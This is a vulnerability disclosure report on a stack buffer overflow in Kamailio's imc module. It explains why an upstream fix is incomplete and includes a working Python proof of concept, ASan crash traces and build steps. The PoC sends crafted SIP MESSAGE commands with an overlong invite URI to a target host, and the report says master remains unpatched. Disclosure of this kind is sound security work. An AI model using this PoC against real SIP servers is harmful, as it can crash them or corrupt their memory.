# imc: Stack buffer overflow in imc_inv_callback() via long member URI

**Module**: imc
**Severity**: High (stack overflow via attacker-controlled URI, triggered by timer)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Attempted fix in**: [`c4c7b919b8`](https://github.com/kamailio/kamailio/commit/c4c7b919b84ae861b02bc85d2fbc5bd747739b17) ("imc: Check member uri length")
**Committed**: 2026-05-04 15:01:23 UTC
**Status**: Incomplete fix; the affected callback remains unsafe in current upstream master as of 2026-09-28
**Stable backports**: Kamailio 6.1 [`cd5228ec7e`](https://github.com/kamailio/kamailio/commit/cd5228ec7e0b9d3675282dcba8d7d025872d4363) (2026-05-18) and Kamailio 6.0 [`8b814fe480`](https://github.com/kamailio/kamailio/commit/8b814fe480750efcf671cc7534f2a6df1ebb0ecb) (2026-06-16), both carrying the same incomplete check
**Reproduction config**: [`kamailio-imc.cfg`](./kamailio-imc.cfg)

---

## Attempted fix and remaining exposure

The attempted fix checks whether `member->uri.len - 4` alone is greater than `sizeof(body_buf)` and jumps to the error path if so. This blocks the largest URI-only copy, but it does not include the 21-byte `" is not registered.  "` suffix written immediately afterward. A safe check must cover the combined URI fragment and suffix before either copy. The patch also does not validate `room->uri.len` or `inv_uri.len` before the later `strncpy()` calls into `from_uri_buf[256]` and `to_uri_buf[256]`.

Consequently, `c4c7b919b8` does not fully fix the three overflow paths described in this report. No later commit touching `imc_inv_callback()` is present in upstream master through 2026-09-28.

When an invited user's URI exceeds 259 bytes, `memcpy(body_final.s, member->uri.s + 4, member->uri.len - 4)` at line 1730 overflows `body_buf[256]`. The callback fires asynchronously when the outgoing MESSAGE to the invited user fails (TM transaction timeout, status >= 300). The member URI is set from the `#invite` command argument, fully controlled by the attacker.

Additionally, `from_uri_buf[256]` and `to_uri_buf[256]` overflow via `strncpy` at lines 1739 and 1745 without proper bounds checks. All three buffers are on the same stack frame, creating a combined overflow surface.

The trigger is indirect: the attacker sends an `#invite` command with a long URI targeting a non-routable IP, then waits for the TM timer to fire. The overflow occurs in the timer process context.

## Vulnerable code

```c
// imc_cmd.c:1684-1731 — imc_inv_callback()
char from_uri_buf[256];   // line 1684
char to_uri_buf[256];     // line 1685
char body_buf[256];       // line 1686

// ...

// member->uri.len can exceed 260 (attacker controls via #invite argument)
memcpy(body_final.s, member->uri.s + 4, member->uri.len - 4);          // line 1730: OVERFLOW
memcpy(body_final.s + member->uri.len - 4, " is not registered.  ", 21); // line 1731: extends overflow
```

The `member->uri` value comes directly from the `#invite <uri>` command sent by any participant in the IMC room. No validation is performed on its length before it is stored.

## Call chain

```
timer_main()
  → timer_handler()
    → final_response_handler()          [TM timeout fires]
      → fake_reply()
        → local_reply()
          → run_trans_callbacks()
            → run_trans_callbacks_internal()
              → imc_inv_callback()       ← STACK OVERFLOW at memcpy (line 1730)
```

## PoC

```python
#!/usr/bin/env python3
"""
PoC: IMC module imc_inv_callback() stack buffer overflow
Target: kamailio with imc module

Bug: imc_cmd.c:1730 - memcpy(body_final.s, member->uri.s + 4, member->uri.len - 4)
     body_buf[256] at line 1686. If member URI > 259 bytes, stack overflow.

Flow: Invite a user with a very long URI → IMC sends MESSAGE → MESSAGE fails →
      callback copies the long URI into body_buf[256] → overflow
"""
import socket
import sys
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 5060

def send_sip(msg):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(msg.encode(), (TARGET, PORT))
    try:
        resp = sock.recv(4096)
        first_line = resp.split(b'\r\n')[0].decode()
        print(f"    Response: {first_line}")
    except socket.timeout:
        print("    No response")
    sock.close()

room = "r"
room_uri = f"sip:{room}@{TARGET}"
attacker = f"sip:a@{TARGET}"

# Step 1: Create room
print("[1] Creating IMC room...")
body1 = "#create"
msg1 = (
    f"MESSAGE {room_uri} SIP/2.0\r\n"
    f"Via: SIP/2.0/UDP 192.168.1.100:5060;branch=z9hG4bK-create\r\n"
    f"From: <{attacker}>;tag=create-tag\r\n"
    f"To: <{room_uri}>\r\n"
    f"Call-ID: imc-create@192.168.1.100\r\n"
    f"CSeq: 1 MESSAGE\r\n"
    f"Content-Type: text/plain\r\n"
    f"Content-Length: {len(body1)}\r\n"
    f"Max-Forwards: 70\r\n"
    f"\r\n"
    f"{body1}"
)
send_sip(msg1)
time.sleep(0.5)

# Step 2: Invite user with very long URI (> 259 bytes)
# Use a non-routable IP so the outgoing MESSAGE times out (→ status >= 300)
# This triggers the callback code path
NONLOCAL = "10.255.255.1"
long_user = "A" * 240
invite_uri = f"sip:{long_user}@{NONLOCAL}"
print(f"[2] Inviting user with URI length={len(invite_uri)} bytes...")
body2 = f"#invite {invite_uri}"
msg2 = (
    f"MESSAGE {room_uri} SIP/2.0\r\n"
    f"Via: SIP/2.0/UDP 192.168.1.100:5060;branch=z9hG4bK-invite\r\n"
    f"From: <{attacker}>;tag=invite-tag\r\n"
    f"To: <{room_uri}>\r\n"
    f"Call-ID: imc-invite@192.168.1.100\r\n"
    f"CSeq: 2 MESSAGE\r\n"
    f"Content-Type: text/plain\r\n"
    f"Content-Length: {len(body2)}\r\n"
    f"Max-Forwards: 70\r\n"
    f"\r\n"
    f"{body2}"
)
send_sip(msg2)

print("[*] Waiting for TM timeout + callback (fr_timer=2s)...")
time.sleep(5)
print("[*] Done. Check ASAN logs for stack-buffer-overflow in imc_inv_callback")
```

## ASan output

Three consecutive violations are detected — the first `memcpy` overflows `body_buf`, then `strncpy` overflows `to_uri_buf`, then the corrupted `to_uri_buf` is read by `str_duplicate` in the TM module:

**Report 1: body_buf overflow (WRITE 21 bytes past end)**

```
=================================================================
==8==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffcb152ac0 at pc 0xaaaacd7d5b94 bp 0xffffcb1526c0 sp 0xffffcb151eb0
WRITE of size 21 at 0xffffcb152ac0 thread T0
    #0 0xaaaacd7d5b90 in __asan_memcpy (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #1 0xffff803726f4 in imc_inv_callback /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:1731:2
    #2 0xffff7cf4e6bc in run_trans_callbacks_internal /usr/src/kamailio/build/src/modules/tm/t_hooks.c:238:4
    #3 0xffff7cf4ecf4 in run_trans_callbacks /usr/src/kamailio/build/src/modules/tm/t_hooks.c:257:2
    #4 0xffff7cfe87c8 in local_reply /usr/src/kamailio/build/src/modules/tm/t_reply.c:2332:5
    #5 0xffff7d041654 in fake_reply /usr/src/kamailio/build/src/modules/tm/timer.c:289:18
    #6 0xffff7d03c41c in final_response_handler /usr/src/kamailio/build/src/modules/tm/timer.c:471:2
    #7 0xffff7d03c41c in retr_buf_handler /usr/src/kamailio/build/src/modules/tm/timer.c:534:3
    #8 0xaaaace0333e4 in slow_timer_main /usr/src/kamailio/build/src/core/timer.c:1200:12
    #9 0xaaaacd8232d4 in main_loop /usr/src/kamailio/build/src/main.c:2007:4
    #10 0xaaaacd83ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #11 0xffff81ac7740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #12 0xffff81ac7814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #13 0xaaaacd75f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

Address 0xffffcb152ac0 is located in stack of thread T0 at offset 960 in frame
    #0 0xffff80371ca4 in imc_inv_callback /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:1682

  This frame has 13 object(s):
    [32, 48) 'body_final' (line 1683)
    [64, 320) 'from_uri_buf' (line 1684)
    [384, 640) 'to_uri_buf' (line 1685)
    [704, 960) 'body_buf' (line 1686) <== Memory access at offset 960 overflows this variable
    [1024, 1040) 'from_uri_s' (line 1687)
    [1056, 1072) 'to_uri_s' (line 1687)
    [1088, 1192) 'uac_r' (line 1690)
    [1232, 1296) '__kld' (line 1694)
    [1328, 1392) '__kld100' (line 1698)
    [1424, 1488) '__kld366' (line 1709)
    [1520, 1584) '__kld495' (line 1719)
    [1616, 1680) '__kld649' (line 1741)
    [1712, 1776) '__kld783' (line 1748)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9) in __asan_memcpy
Shadow bytes around the buggy address:
  0x200ff962a500: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2
  0x200ff962a510: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a530: f2 f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff962a550: 00 00 00 00 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2
  0x200ff962a560: 00 00 f2 f2 00 00 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a570: 00 00 00 00 00 f2 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8
  0x200ff962a580: f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2
  0x200ff962a590: f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8
  0x200ff962a5a0: f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

**Report 2: to_uri_buf overflow (strncpy WRITE 257 bytes into 256-byte buffer)**

```
=================================================================
==8==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffcb152980 at pc 0xaaaacd7c1370 bp 0xffffcb1526b0 sp 0xffffcb151ea0
WRITE of size 257 at 0xffffcb152980 thread T0
    #0 0xaaaacd7c136c in __interceptor_strncpy (/usr/local/sbin/kamailio+0x2a136c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #1 0xffff80373068 in imc_inv_callback /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:1745:2
    #2 0xffff7cf4e6bc in run_trans_callbacks_internal /usr/src/kamailio/build/src/modules/tm/t_hooks.c:238:4
    #3 0xffff7cf4ecf4 in run_trans_callbacks /usr/src/kamailio/build/src/modules/tm/t_hooks.c:257:2
    #4 0xffff7cfe87c8 in local_reply /usr/src/kamailio/build/src/modules/tm/t_reply.c:2332:5
    #5 0xffff7d041654 in fake_reply /usr/src/kamailio/build/src/modules/tm/timer.c:289:18
    #6 0xffff7d03c41c in final_response_handler /usr/src/kamailio/build/src/modules/tm/timer.c:471:2
    #7 0xffff7d03c41c in retr_buf_handler /usr/src/kamailio/build/src/modules/tm/timer.c:534:3
    #8 0xaaaace0333e4 in slow_timer_main /usr/src/kamailio/build/src/core/timer.c:1200:12
    #9 0xaaaacd8232d4 in main_loop /usr/src/kamailio/build/src/main.c:2007:4
    #10 0xaaaacd83ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #11 0xffff81ac7740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #12 0xffff81ac7814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #13 0xaaaacd75f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

Address 0xffffcb152980 is located in stack of thread T0 at offset 640 in frame
    #0 0xffff80371ca4 in imc_inv_callback /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:1682

  This frame has 13 object(s):
    [32, 48) 'body_final' (line 1683)
    [64, 320) 'from_uri_buf' (line 1684)
    [384, 640) 'to_uri_buf' (line 1685) <== Memory access at offset 640 overflows this variable
    [704, 960) 'body_buf' (line 1686)
    [1024, 1040) 'from_uri_s' (line 1687)
    [1056, 1072) 'to_uri_s' (line 1687)
    [1088, 1192) 'uac_r' (line 1690)
    [1232, 1296) '__kld' (line 1694)
    [1328, 1392) '__kld100' (line 1698)
    [1424, 1488) '__kld366' (line 1709)
    [1520, 1584) '__kld495' (line 1719)
    [1616, 1680) '__kld649' (line 1741)
    [1712, 1776) '__kld783' (line 1748)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/sbin/kamailio+0x2a136c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9) in __interceptor_strncpy
Shadow bytes around the buggy address:
  0x200ff962a4e0: f1 f1 f1 f1 00 00 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a4f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a500: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2
  0x200ff962a510: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff962a530:[f2]f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a550: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2
  0x200ff962a560: 00 00 f2 f2 00 00 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a570: 00 00 00 00 00 f2 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8
  0x200ff962a580: f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

**Report 3: corrupted to_uri_buf READ by TM str_duplicate (257 bytes from overflowed region)**

```
=================================================================
==8==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffcb152980 at pc 0xaaaacd7d5af8 bp 0xffffcb152200 sp 0xffffcb1519f0
READ of size 257 at 0xffffcb152980 thread T0
    #0 0xaaaacd7d5af4 in __asan_memcpy (/usr/local/sbin/kamailio+0x2b5af4) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)
    #1 0xffff7ce8ea40 in str_duplicate /usr/src/kamailio/build/src/modules/tm/dlg.c:206:2
    #2 0xffff7ce8d420 in new_dlg_uac /usr/src/kamailio/build/src/modules/tm/dlg.c:353:5
    #3 0xffff7d0b8394 in request /usr/src/kamailio/build/src/modules/tm/uac.c:1255:5
    #4 0xffff803735ac in imc_inv_callback /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:1751:2
    #5 0xffff7cf4e6bc in run_trans_callbacks_internal /usr/src/kamailio/build/src/modules/tm/t_hooks.c:238:4
    #6 0xffff7cf4ecf4 in run_trans_callbacks /usr/src/kamailio/build/src/modules/tm/t_hooks.c:257:2
    #7 0xffff7cfe87c8 in local_reply /usr/src/kamailio/build/src/modules/tm/t_reply.c:2332:5
    #8 0xffff7d041654 in fake_reply /usr/src/kamailio/build/src/modules/tm/timer.c:289:18
    #9 0xffff7d03c41c in final_response_handler /usr/src/kamailio/build/src/modules/tm/timer.c:471:2
    #10 0xffff7d03c41c in retr_buf_handler /usr/src/kamailio/build/src/modules/tm/timer.c:534:3
    #11 0xaaaace0333e4 in slow_timer_main /usr/src/kamailio/build/src/core/timer.c:1200:12
    #12 0xaaaacd8232d4 in main_loop /usr/src/kamailio/build/src/main.c:2007:4
    #13 0xaaaacd83ee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #14 0xffff81ac7740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #15 0xffff81ac7814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #16 0xaaaacd75f56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9)

Address 0xffffcb152980 is located in stack of thread T0 at offset 640 in frame
    #0 0xffff80371ca4 in imc_inv_callback /usr/src/kamailio/build/src/modules/imc/imc_cmd.c:1682

  This frame has 13 object(s):
    [32, 48) 'body_final' (line 1683)
    [64, 320) 'from_uri_buf' (line 1684)
    [384, 640) 'to_uri_buf' (line 1685) <== Memory access at offset 640 partially underflows this variable
    [704, 960) 'body_buf' (line 1686)
    [1024, 1040) 'from_uri_s' (line 1687)
    [1056, 1072) 'to_uri_s' (line 1687)
    [1088, 1192) 'uac_r' (line 1690)
    [1232, 1296) '__kld' (line 1694)
    [1328, 1392) '__kld100' (line 1698)
    [1424, 1488) '__kld366' (line 1709)
    [1520, 1584) '__kld495' (line 1719)
    [1616, 1680) '__kld649' (line 1741)
    [1712, 1776) '__kld783' (line 1748)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/sbin/kamailio+0x2b5af4) (BuildId: c382f637a7723074bc40810c94d8335f14c454c9) in __asan_memcpy
Shadow bytes around the buggy address:
  0x200ff962a4e0: f1 f1 f1 f1 00 00 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a4f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a500: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2
  0x200ff962a510: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff962a530:[f2]f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ff962a550: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2
  0x200ff962a560: 00 00 f2 f2 00 00 f2 f2 00 00 00 00 00 00 00 00
  0x200ff962a570: 00 00 00 00 00 f2 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8
  0x200ff962a580: f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

## Build & reproduce

```bash
git clone https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

mkdir build && cd build
CC=clang cmake .. \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O1 -g" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address"
make -j$(nproc) && make install

# kamailio.cfg must load imc + tm modules and route MESSAGEs to imc_manager():
#   loadmodule "tm.so"
#   loadmodule "imc.so"
#   modparam("tm", "fr_timer", 2000)   # 2s timeout for faster reproduction
#   route { if(is_method("MESSAGE")) { imc_manager(); } }

ASAN_OPTIONS="detect_leaks=0:halt_on_error=0:log_path=/tmp/asan" \
    kamailio -DD -E -f kamailio.cfg

python3 poc.py 127.0.0.1
# Wait ~5 seconds for timer timeout
cat /tmp/asan.*
```
